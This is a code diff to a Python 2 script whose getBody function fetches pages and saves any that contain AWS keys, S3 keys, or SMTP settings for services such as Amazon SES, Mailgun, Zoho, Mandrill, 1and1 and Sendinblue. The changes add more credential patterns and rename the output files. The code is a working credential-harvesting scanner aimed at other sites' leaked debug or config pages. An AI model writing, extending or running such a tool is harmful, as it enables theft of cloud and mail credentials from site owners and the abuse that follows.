@@ -24,9 +24,13 @@ def getBody(ourl):
         elif re.search("AWS_KEY", bodinya):
             print "K.DEBUG > ", ourl
             open('aws_key_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("AWS_ACCESS_KEY", bodinya):
+            print "K.DEBUG > ", ourl
+            open('AWKEY'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("S3_KEY", bodinya):
             print "K.DEBUG > ", ourl
             open('s3key_'+url.netloc+'.html',"w+").write(bodinya)
+
         #startaws    
 
         elif re.search("email-smtp.us-east-2.amazonaws.com", bodinya):
@@ -84,9 +88,10 @@ def getBody(ourl):
             print "K.DEBUG > ", ourl
             open('amazonaws_'+url.netloc+'.html',"w+").write(bodinya)
         #endaws
-        elif re.search("mandrill", bodinya):
+
+        elif re.search("1and1", bodinya):
             print "K.DEBUG > ", ourl
-            open(url.netloc+'.html',"w+").write(bodinya)
+            open('1and1_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("smtp.mailgun", bodinya):
             print "K.DEBUG > ", ourl
             open('mailgun_'+url.netloc+'.html',"w+").write(bodinya)
@@ -96,6 +101,9 @@ def getBody(ourl):
         elif re.search("smtp.zoho", bodinya):
             print "K.DEBUG > ", ourl
             open('zoho_'+url.netloc+'.html',"w+").write(bodinya)
+        elif re.search("mandrillapp", bodinya):
+            print "K.DEBUG > ", ourl
+            open('mandrillapp_'+url.netloc+'.html',"w+").write(bodinya)
         elif re.search("sendinblue.com", bodinya):
             print "K.DEBUG > ", ourl
             open('sendinblue_'+url.netloc+'.html',"w+").write(bodinya)
